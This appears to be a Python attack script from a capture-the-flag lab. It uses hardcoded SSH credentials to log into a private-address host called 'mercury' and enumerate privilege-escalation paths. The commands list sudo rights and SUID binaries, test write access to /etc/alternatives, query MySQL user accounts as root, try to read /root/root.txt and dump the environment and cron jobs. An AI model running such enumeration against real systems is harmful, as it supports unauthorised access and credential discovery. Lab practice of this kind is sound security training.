#!/usr/bin/env python3
"""Targeted SSH enumeration of mercury target - linuxmaster@192.168.56.113"""
import paramiko

TARGET = "192.168.56.113"
USERNAME = "linuxmaster"
PASSWORD = "mercurymeandiameteris4880km"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(TARGET, username=USERNAME, password=PASSWORD, timeout=10)

def run(cmd, label=None):
    if label:
        print(f"\n{'='*60}")
        print(f"  {label}")
        print(f"{'='*60}")
    stdin, stdout, stderr = client.exec_command(cmd)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    if out:
        print(out)
    if err and "No such" not in err:
        print(f"[ERR] {err}")
    return out

print("[*] Connected as linuxmaster@192.168.56.113")

# 1. Identity & sudo
run("whoami && id", "IDENTITY")
run("sudo -l 2>&1", "SUDO ACCESS")

# 2. SUID binaries (critical for escalation)
suid = run("find / -perm /4000 -type f 2>/dev/null", "SUID BINARIES")

# 3. Writable symlinks in /etc/alternatives
run("ls -la /etc/alternatives/vim /etc/alternatives/vimdiff /usr/bin/vim.basic 2>&1", "VIM SYMLINK CHAIN")
run("touch /etc/alternatives/test_write 2>&1; rm -f /etc/alternatives/test_write", "WRITE TEST /etc/alternatives")

# 4. hi.sh contents (already known to exist)
run("cat /home/linuxmaster/hi.sh", "HI.SH CONTENTS")

# 5. MySQL status & credentials
run("service mysql status 2>&1", "MYSQL STATUS")
run("mysql -u root -e 'SELECT User, Host FROM mysql.user;' 2>&1 | head -20", "MYSQL USERS")

# 6. Root flag location
run("find /root -type f 2>/dev/null", "ROOT FILES")
run("cat /root/root.txt 2>/dev/null || echo 'NO ROOT FLAG YET'", "ROOT FLAG CHECK")

# 7. Listening services
run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", "LISTENING SERVICES")

# 8. Environment
run("env | sort", "ENVIRONMENT")

# 9. Check vimdiff sudo capability
run("sudo -n vimdiff --version 2>&1 | head -3", "VIMDIFF SUDO CHECK")

# 10. Cron jobs
run("crontab -l 2>&1; ls -la /etc/cron* 2>/dev/null", "CRON JOBS")

# 11. Check for any writable system paths
run("find /etc/alternatives -type l -writable 2>/dev/null", "WRITABLE SYMLINKS IN ALTERNATIVES")

client.close()
print("\n[+] Enumeration complete.")
